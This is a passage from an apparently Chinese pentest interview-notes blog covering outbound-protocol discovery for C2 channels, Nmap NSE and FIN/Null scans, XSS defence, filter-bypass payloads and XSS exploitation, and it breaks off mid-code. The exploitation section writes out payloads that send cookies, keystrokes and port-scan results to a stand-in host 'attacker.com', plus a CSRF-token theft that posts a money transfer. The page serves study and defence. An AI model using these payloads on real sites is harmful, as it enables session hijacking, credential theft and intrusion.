<li><strong>返回结果</strong>：找到这个组后，域控制器会从该组的属性中提取出所有**成员（members）**的信息，然后将这些信息打包成一个响应，返回给你的电脑。你的电脑随后会解析这个响应，并在命令行中显示出组成员的列表</li>
</ol>
<hr>
<h3 id="如何判断目标单位的机器是哪种协议出网"><a href="#如何判断目标单位的机器是哪种协议出网" class="headerlink" title="如何判断目标单位的机器是哪种协议出网"></a>如何判断目标单位的机器是哪种协议出网</h3><p><strong>1. 自动化扫描与端口探测</strong></p>
<p>这是最直接且高效的方法</p>
<ul>
<li><strong>使用自动化工具</strong>：利用 <strong>Nmap</strong> 或 <strong><code>port-scan</code></strong> 这类工具，对目标内网机器或出网网段进行扫描</li>
<li><strong>常用端口与协议</strong>：<ul>
<li><strong>HTTP&#x2F;HTTPS</strong>（80&#x2F;443）：这是最常见的出网协议。几乎所有企业都必须开放这两个端口以供员工浏览网页。这是一个非常好的 C2 通道选择</li>
<li><strong>DNS</strong>（53）：如果 DNS 请求能够出网，那么你可以利用 DNS 隧道技术。这种方法非常隐蔽，因为 DNS 流量通常被认为是无害的</li>
<li><strong>SMTP&#x2F;SMTPS</strong>（25&#x2F;465&#x2F;587）：如果企业允许员工收发邮件，那么这些端口很可能出网</li>
<li><strong>FTP&#x2F;FTPS</strong>（20&#x2F;21）：不常见，但如果开放了，也是一个很好的出网通道</li>
<li><strong>SSH</strong>（22）：如果目标允许员工通过 SSH 远程访问服务器，那么这个端口很可能出网</li>
</ul>
</li>
<li><strong>优点</strong>：快速、自动化，能提供初步的端口开放信息</li>
<li><strong>缺点</strong>：不一定能确定协议能否出网，因为端口开放可能只是用于内部服务</li>
</ul>
<p><strong>2. 手动测试与验证</strong></p>
<p>自动化扫描后，你需要手动验证协议是否真的能出网</p>
<ul>
<li><p><strong>使用命令行工具</strong>：</p>
<ul>
<li><strong><code>ping</code></strong>：测试 ICMP 协议是否出网</li>
<li><strong><code>telnet</code></strong> 或 <strong><code>nc</code> (netcat)</strong>：测试 TCP 协议。例如，<code>telnet www.baidu.com 443</code> 或 <code>nc -vz www.baidu.com 443</code>。如果连接成功，说明 443 端口出网</li>
</ul>
</li>
<li><p><strong>利用编程语言</strong>：</p>
<ul>
<li><p><strong>Python</strong>：编写一个简单的 Python 脚本，尝试通过不同的协议向你的服务器发送请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">5</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;your_server_ip&#x27;</span>, <span class="number">443</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Port 443 is open&quot;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Port 443 is closed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>优点</strong>：能精确验证某个端口是否出网，并能获得更详细的错误信息</p>
</li>
</ul>
<p><strong>3. 基于 DNS 查询的隐蔽测试</strong></p>
<p>如果你无法通过常见的协议出网，DNS 是一个非常隐蔽的测试方法</p>
<ul>
<li><strong>原理</strong>：即使防火墙非常严格，也必须允许 DNS 流量出网，否则员工将无法正常上网。你可以利用这个特性，通过 DNS 查询来判断出网情况</li>
<li><strong>操作步骤</strong>：<ol>
<li>在你的攻击服务器上，搭建一个 DNS 服务器，并配置一个域名，例如 <code>test.com</code></li>
<li>在目标机器上，执行一个 DNS 查询命令，例如 <code>nslookup &lt;随机字符串&gt;.test.com</code></li>
<li>回到你的 DNS 服务器，如果收到了这个 DNS 查询请求，就说明 DNS 协议出网。你甚至可以从 DNS 请求的源 IP 地址，判断是哪台机器发出的请求</li>
</ol>
</li>
<li><strong>优点</strong>：高度隐蔽，能绕过许多严格的防火墙规则</li>
</ul>
<p><strong>4. 利用现有权限进行系统配置分析</strong></p>
<p>如果你已经通过其他漏洞（如钓鱼、弱口令等）获得了某台机器的权限，那么判断出网协议就变得更加容易</p>
<ul>
<li><strong>检查防火墙规则</strong>：<ul>
<li><strong>Windows</strong>：<code>netsh advfirewall firewall show rule name=all</code> 或 <code>Get-NetFirewallRule</code>。这能直接告诉你哪些端口是出网的</li>
</ul>
</li>
<li><strong>检查代理服务器</strong>：<ul>
<li><strong>Windows</strong>：<code>netsh winhttp show proxy</code> 或检查浏览器的代理设置。许多公司要求所有出网流量必须通过一个代理服务器。在这种情况下，你需要配置你的 C2 通道去使用这个代理</li>
</ul>
</li>
<li><strong>检查应用程序日志</strong>：<ul>
<li>查看 Web 服务器、代理服务器或防火墙的日志。这些日志文件会记录所有出入流量，是判断出网协议的最佳来源</li>
</ul>
</li>
</ul>
<hr>
<h3 id="NSE-脚本原理"><a href="#NSE-脚本原理" class="headerlink" title="NSE 脚本原理"></a>NSE 脚本原理</h3><p><strong>1. NSE 脚本的运行机制</strong></p>
<p>NSE 的核心是一个脚本解释器，它运行用 <strong>Lua 语言</strong>编写的脚本。Nmap 会在扫描过程中加载并执行这些脚本，以扩展其核心功能。整个运行机制可以概括为以下几个步骤：</p>
<ol>
<li><strong>脚本加载</strong>：Nmap 在启动时，会根据你的命令行参数（如 <code>-sC</code> 或 <code>--script &lt;脚本名&gt;</code>），加载相应的 NSE 脚本。这些脚本文件通常位于 Nmap 的安装目录下的 <code>scripts</code> 文件夹中</li>
<li><strong>事件触发</strong>：NSE 脚本不会无缘无故地运行。它依赖于一系列的<strong>事件触发器（Triggers）</strong>，这些触发器会在 Nmap 的不同扫描阶段被激活<ul>
<li><code>pre-scan</code>：在任何主机扫描开始之前运行。通常用于一些全局性任务，如收集 DNS 信息</li>
<li><code>host-scan</code>：在扫描每个主机时运行。通常用于对单个主机进行枚举或漏洞检测</li>
<li><code>port-scan</code>：在扫描每个端口时运行。这是最常用的触发器，用于针对特定端口的服务进行探测，如 HTTP、FTP、SSH 等</li>
<li><code>post-scan</code>：在所有主机扫描完成后运行。通常用于汇总结果或生成报告</li>
</ul>
</li>
<li><strong>脚本执行</strong>：当一个事件被触发时，Nmap 会调用相应脚本中的**<code>action()</code> 函数**。这个函数包含了脚本要执行的核心逻辑</li>
<li><strong>结果返回</strong>：<code>action()</code> 函数执行完毕后，会将结果返回给 Nmap。Nmap 会将这些结果以标准的格式（如 XML、文本等）显示给用户</li>
</ol>
<p><strong>2. 编写 NSE 脚本的核心结构</strong></p>
<p>一个典型的 NSE 脚本由以下几个关键部分组成：</p>
<ol>
<li><strong>脚本描述（<code>description</code>）</strong>：一个简短的字符串，描述脚本的功能</li>
<li><strong>分类（<code>categories</code>）</strong>：脚本的分类，如 <code>safe</code>（安全）、<code>vuln</code>（漏洞）、<code>auth</code>（认证）等。这些分类使得用户可以通过 <code>-sC</code> 或 <code>--script=safe</code> 等参数来批量运行某一类脚本</li>
<li><strong>依赖关系（<code>dependencies</code>）</strong>：如果脚本依赖于其他脚本，可以在这里声明</li>
<li><strong>触发器（<code>hostrule</code>、<code>portrule</code> 等）</strong>：指定脚本在什么条件下运行。例如，<code>portrule</code> 规定了脚本只在发现某个特定端口开放时才运行<ul>
<li><code>portrule = &quot;tcp or udp&quot;</code>：在所有 TCP 或 UDP 端口上运行</li>
<li><code>portrule = &quot;port:80&quot;</code>：只在 80 端口上运行</li>
<li><code>hostrule</code>：在整个主机上运行，不依赖于特定端口</li>
</ul>
</li>
<li><strong>主函数（<code>action()</code>）</strong>：这是脚本的核心代码，包含了所有业务逻辑。在这个函数中，你可以使用 Nmap 提供的各种库函数（如 <code>http.get</code>、<code>nmap.set_port_state</code> 等），来完成网络交互和数据处理</li>
</ol>
<hr>
<h3 id="Nmap-的-FIN-扫描和空扫描是什么"><a href="#Nmap-的-FIN-扫描和空扫描是什么" class="headerlink" title="Nmap 的 FIN 扫描和空扫描是什么"></a>Nmap 的 FIN 扫描和空扫描是什么</h3><p><strong>1. FIN 扫描 (FIN Scan)</strong></p>
<ul>
<li><strong>命令</strong>：<code>nmap -sF &lt;target&gt;</code></li>
<li><strong>原理</strong>：<ul>
<li>FIN 扫描的原理基于 TCP 协议的 RFC 793 规范</li>
<li>攻击者向目标端口发送一个只包含 <strong><code>FIN</code></strong>（Finish）标志位的 TCP 数据包</li>
<li><strong>如果端口是关闭的</strong>：根据 TCP 协议规范，目标系统会回复一个带有 <strong><code>RST</code></strong>（Reset）标志位的 TCP 包，表示连接已重置</li>
<li><strong>如果端口是开放的</strong>：根据 TCP 协议规范，目标系统会忽略这个包，<strong>不回复任何信息</strong></li>
</ul>
</li>
<li><strong>优点</strong>：<ul>
<li><strong>隐蔽性</strong>：由于不进行完整的三次握手，许多基本的防火墙和 IDS 都不会记录这种连接尝试，从而使扫描行为更加隐蔽</li>
<li><strong>绕过状态防火墙</strong>：一些状态防火墙只跟踪那些以 <code>SYN</code> 包开始的连接。由于 FIN 扫描不使用 <code>SYN</code> 包，因此可以绕过这类防火墙</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>Windows 兼容性</strong>：FIN 扫描在许多非 Windows 系统（如 Linux、BSD）上表现良好，但在 Windows 系统上，即使端口是开放的，它也可能回复一个 <code>RST</code> 包，导致扫描结果不准确。这是因为 Windows 系统的 TCP&#x2F;IP 栈实现与 RFC 规范略有不同</li>
</ul>
</li>
</ul>
<p><strong>2. 空扫描 (Null Scan)</strong></p>
<ul>
<li><strong>命令</strong>：<code>nmap -sN &lt;target&gt;</code></li>
<li><strong>原理</strong>：<ul>
<li>空扫描的原理与 FIN 扫描类似，也基于 TCP 协议规范</li>
<li>攻击者向目标端口发送一个<strong>没有任何标志位</strong>（<code>SYN</code>, <code>ACK</code>, <code>FIN</code>, <code>RST</code> 等）的 TCP 数据包</li>
<li><strong>如果端口是关闭的</strong>：根据 TCP 协议规范，目标系统会回复一个带有 <strong><code>RST</code></strong> 标志位的 TCP 包</li>
<li><strong>如果端口是开放的</strong>：根据 TCP 协议规范，目标系统会忽略这个包，<strong>不回复任何信息</strong></li>
</ul>
</li>
<li><strong>优点</strong>：<ul>
<li><strong>极度隐蔽</strong>：由于发送的数据包没有任何标志位，空扫描比 FIN 扫描更具隐蔽性，因为数据包看起来像是损坏或无效的，许多 IDS 可能会直接忽略它</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>Windows 兼容性</strong>：与 FIN 扫描一样，空扫描在 Windows 系统上同样表现不佳，即使端口开放，也可能收到 <code>RST</code> 回复，导致误报</li>
</ul>
</li>
</ul>
<hr>
<h1 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3- XSS"></a>3- XSS</h1><h3 id="输出到-href-属性的-XSS-如何防御"><a href="#输出到-href-属性的-XSS-如何防御" class="headerlink" title="输出到 href 属性的 XSS 如何防御"></a>输出到 href 属性的 XSS 如何防御</h3><p><strong>1. 严格的白名单验证</strong></p>
<p>这是最安全、最推荐的防御方法。<strong>不要</strong>试图去黑名单过滤，因为攻击者总能找到绕过的方法。相反，你应该只允许那些已知安全的协议和域名</p>
<ul>
<li><strong>只允许安全的协议</strong>：只接受 <code>http</code> 和 <code>https</code> 协议。所有其他协议，特别是 <code>javascript:</code>、<code>data:</code>、<code>vbscript:</code> 等，都应该被拒绝</li>
<li><strong>示例</strong>：<ul>
<li><strong>安全</strong>：<code>https://www.example.com</code></li>
<li><strong>不安全</strong>：<code>javascript:alert(1)</code></li>
</ul>
</li>
</ul>
<p><strong>实现方式</strong>： 在后端代码中，你可以使用正则表达式或内置的 URL 解析函数来检查协议。例如，在 PHP 中可以这样做：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_safe_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果没有协议头，可能是相对路径，视为安全</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 只允许 http 或 https 协议</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$parsed_url</span>[<span class="string">&#x27;scheme&#x27;</span>], [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_input_url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_safe_url</span>(<span class="variable">$user_input_url</span>)) &#123;</span><br><span class="line">    <span class="comment">// URL 安全，进行输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input_url</span>) . <span class="string">&#x27;&quot;&gt;Click Here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// URL 不安全，拒绝或使用默认值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;/default-page&quot;&gt;Click Here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2. 对所有 URL 进行 HTML 实体编码</strong></p>
<p>这是防御 XSS 的基本操作，但它<strong>不足以</strong>防御 <code>href</code> XSS。你仍然需要执行它，因为它能防止其他类型的 XSS 攻击htmlspecialchars()<code>或</code>htmlentities()<code>可以将</code>&lt;<code>、</code>&gt;<code>、</code>“&#96; 等特殊字符转换为实体，防止它们被解释为 HTML 标签</p>
<ul>
<li><p><strong>正确做法</strong>：将 URL 进行白名单验证后，再进行 HTML 实体编码</p>
<ul>
<li><p><strong>示例</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe_url</span> = <span class="string">&quot;https://example.com/page?param=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$safe_url</span>) . <span class="string">&#x27;&quot;&gt;Click Here&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>结果</strong>：浏览器渲染为 <code>&lt;a href=&quot;https://example.com/page?param=&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;Click Here&lt;/a&gt;</code>。即使 URL 中包含恶意代码，它也不会被执行。但如果 URL 是 <code>javascript:alert(1)</code>，单独使用 <code>htmlspecialchars()</code> 是无效的</p>
</li>
</ul>
</li>
</ul>
<p><strong>3. CSP</strong></p>
<p>CSP 是一个强大的安全策略，可以从根本上限制页面可以加载和执行的资源。你可以设置一个 CSP 规则，明确禁止 <code>javascript:</code> 协议的 URI</p>
<ul>
<li><p><strong>在 HTTP 响应头中添加</strong>： <code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;; object-src &#39;none&#39;;</code></p>
<p>这条规则<strong>不直接</strong>阻止 <code>href</code> 中的 <code>javascript:</code>，但它可以与<strong>不安全的内联脚本</strong>（<code>unsafe-inline</code>）策略结合使用。一个更严格的 CSP 策略可以禁止内联脚本，从而让 <code>javascript:</code> 协议失效</p>
</li>
<li><p><strong>一个更有效的 CSP 规则</strong>： <code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;;</code></p>
<p>这条规则禁止了所有内联脚本，包括 <code>javascript:</code> 协议，从而提供了额外的保护层。不过，这可能会对你的网站功能造成影响，需要在部署前进行全面测试</p>
</li>
</ul>
<hr>
<h3 id="XSS-绕过方式"><a href="#XSS-绕过方式" class="headerlink" title="XSS 绕过方式"></a>XSS 绕过方式</h3><p><strong>1. 大小写混淆绕过</strong></p>
<p>许多过滤规则是针对特定大小写模式的，比如 <code>&lt;script&gt;</code>。你可以尝试使用大小写混淆的方式来绕过，例如：</p>
<ul>
<li><code>&lt;sCrIpT&gt;</code></li>
<li><code>&lt;ScrIpT&gt;</code></li>
<li><code>&lt;SCript&gt;</code></li>
</ul>
<p>这种方式通常在不区分大小写的环境中有效</p>
<p><strong>2. 空白字符、换行符和 Tab 键绕过</strong></p>
<p>过滤器有时会忽略或者处理不当某些空白字符。你可以尝试在标签、属性名或者属性值之间插入空格、换行符（<code>%0a</code>或<code>%0d</code>）或者 Tab 键（<code>%09</code>）来绕过，例如：</p>
<ul>
<li><code>&lt;img src=&quot;javascript:alert(1);&quot;&gt;</code> 可以尝试写成 <code>&lt;img src=&quot; javascript: alert(1); &quot;&gt;</code></li>
<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 可以尝试写成 <code>&lt;script%0a&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
<p><strong>3. 使用编码绕过</strong></p>
<p>许多过滤器会试图拦截特定字符，比如尖括号 <code>&lt; &gt;</code> 和引号 <code>&quot;</code> <code>&#39;</code>。你可以使用 HTML 实体编码、URL 编码或者其他编码方式来绕过</p>
<ul>
<li><strong>URL 编码：</strong><ul>
<li><code>(</code> 编码为 <code>%28</code></li>
<li><code>)</code> 编码为 <code>%29</code></li>
<li><code> </code> 编码为 <code>%20</code></li>
</ul>
</li>
</ul>
<p><strong>4. 标签和属性嵌套绕过</strong></p>
<p>有些过滤器可能只过滤顶层的脚本标签，但忽略嵌套的标签。你可以尝试在标签内部使用其他标签或者属性来注入，例如：</p>
<ul>
<li><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click Me&lt;/a&gt;</code></li>
<li><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></li>
<li><code>&lt;svg onload=alert(1)&gt;</code></li>
</ul>
<p><strong>5. 事件处理器绕过</strong></p>
<p>除了最常见的 <code>onload</code> 和 <code>onerror</code> 事件，还有很多其他事件可以用来触发脚本，例如：</p>
<ul>
<li><code>onmouseover</code></li>
<li><code>onmouseout</code></li>
<li><code>onclick</code></li>
<li><code>onfocus</code></li>
<li><code>onblur</code></li>
<li><code>onchange</code></li>
</ul>
<p>例如：<code>&lt;input onfocus=alert(1) autofocus&gt;</code></p>
<p><strong>6. 使用特殊字符绕过</strong></p>
<p>一些特殊字符，如反引号（&#96;）、反斜杠（&#96;&#96;）等，在特定情况下可以用来绕过过滤。例如，在某些 JavaScript 语法中，反引号可以用来包裹字符串并执行代码</p>
<hr>
<h3 id="XSS-利用方式"><a href="#XSS-利用方式" class="headerlink" title="XSS 利用方式"></a>XSS 利用方式</h3><p><strong>1. 窃取 Cookie 和 Session</strong></p>
<p>这是最常见且危害最大的利用方式之一。通过执行恶意 JavaScript，攻击者可以获取用户的 Cookie，特别是那些用于身份验证的 Session Cookie。一旦获得，攻击者就可以冒充用户身份，无需密码即可登录网站，窃取个人信息、进行非法操作，比如转账或发布恶意内容</p>
<p>恶意代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://attacker.com/cookie_stealer.php?c=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码会将当前页面的所有 Cookie 发送到攻击者的服务器上</p>
<p><strong>2. 键盘记录</strong></p>
<p>攻击者可以植入键盘记录器来捕获用户在当前页面输入的所有信息，包括用户名、密码、信用卡号等敏感数据。这种方式尤其危险，因为用户可能在毫无察觉的情况下泄露重要信息</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="comment">// 将用户按键信息发送到攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/keylogger.php?key=&#x27;</span> + e.<span class="property">key</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3. 钓鱼攻击</strong></p>
<p>通过 XSS，攻击者可以篡改网页内容，插入虚假的登录框或提示信息，诱骗用户输入账户和密码。例如，在合法网站的页面上弹出一个伪造的登录框，提示用户“您的会话已过期，请重新登录”。用户以为是正常操作，输入信息后，这些信息就会被发送到攻击者的服务器</p>
<p><strong>4. 网页挂马和恶意重定向</strong></p>
<p>攻击者可以利用 XSS 将用户浏览器重定向到恶意网站，或者在当前页面上加载恶意脚本（例如，加密勒索病毒）</p>
<p>恶意代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://malicious-site.com&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>或者加载一个恶意脚本：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://malicious-site.com/malware.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>5. 绕过同源策略</strong></p>
<p>虽然浏览器的同源策略限制了不同源的脚本互相访问，但在某些特定情况下，XSS 可以作为绕过同源策略的第一步。一旦在目标域上执行了脚本，攻击者就可以访问该域下的敏感数据，比如通过 AJAX 请求获取用户的私人信息</p>
<p><strong>6. 盗用 CSRF Token</strong></p>
<p>许多网站使用 CSRF Token 来防御跨站请求伪造攻击。但如果存在 XSS 漏洞，攻击者可以轻松地通过 JavaScript 获取页面中的 CSRF Token，然后构造一个合法的请求（例如，转账请求），并代表用户提交</p>
<p>恶意代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 通过 AJAX 请求获取页面内容</span></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/user/profile&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 从 HTML 中解析 CSRF Token，并构造一个请求</span></span><br><span class="line">    <span class="keyword">const</span> csrfToken = html.<span class="title function_">match</span>(<span class="regexp">/csrf-token&quot; content=&quot;(.*?)&quot;&gt;/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/transfer&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="string">`amount=1000&amp;to=attacker&amp;_csrf=<span class="subst">$&#123;csrfToken&#125;</span>`</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>7. DOM 篡改</strong></p>
<p>攻击者可以修改页面上的 DOM 元素，例如，隐藏或替换页面上的某些内容，或者插入广告、恶意链接等</p>
<hr>
<h3 id="XSS-怎么打内网"><a href="#XSS-怎么打内网" class="headerlink" title="XSS 怎么打内网"></a>XSS 怎么打内网</h3><p><strong>1. 端口扫描</strong></p>
<p>这是最基础也最常见的利用方式。攻击者可以通过 JavaScript 构造请求（如 <code>&lt;img&gt;</code> 或 <code>&lt;iframe&gt;</code> 标签），尝试加载内网 IP 地址和端口，并根据加载成功或失败来判断端口是否开放</p>
<p><strong>基本思路：</strong></p>
<ul>
<li><p><strong>加载 <code>&lt;img&gt;</code> 标签</strong>： <code>&lt;img&gt;</code> 标签的 <code>src</code> 属性可以指向内网 IP 和端口。如果图片能够加载成功，就说明该端口是开放的。可以通过 <code>onerror</code> 和 <code>onload</code> 事件来判断加载结果</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> targetPorts = [<span class="number">80</span>, <span class="number">22</span>, <span class="number">445</span>, <span class="number">8080</span>];</span><br><span class="line"></span><br><span class="line">targetPorts.<span class="title function_">forEach</span>(<span class="function"><span class="params">port</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">  img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 端口开放</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is open.`</span>);</span><br><span class="line">    <span class="comment">// 将结果发送回攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?ip=<span class="subst">$&#123;targetIp&#125;</span>&amp;port=<span class="subst">$&#123;port&#125;</span>&amp;status=open`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  img.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 端口关闭或无法访问</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is closed.`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  img.<span class="property">src</span> = <span class="string">`http://<span class="subst">$&#123;targetIp&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>加载 <code>&lt;iframe&gt;</code> 标签</strong>： <code>&lt;iframe&gt;</code> 标签可以用来加载内网页面。如果加载成功，攻击者可以通过 JavaScript 获取页面的部分内容（但受同源策略限制）</p>
</li>
</ul>
<p><strong>2. 服务指纹识别</strong></p>
<p>通过上一步的端口扫描，攻击者可以确定内网中有哪些服务是开放的。接下来，可以通过 JavaScript 发送 AJAX 请求到这些服务，然后根据响应头（如 <code>Server</code>、<code>X-Powered-By</code>）或页面内容来识别服务的类型和版本</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetUrl = <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(targetUrl)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 检查响应头，获取服务信息</span></span><br><span class="line">    <span class="keyword">const</span> serverHeader = response.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Server&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server on <span class="subst">$&#123;targetUrl&#125;</span> is: <span 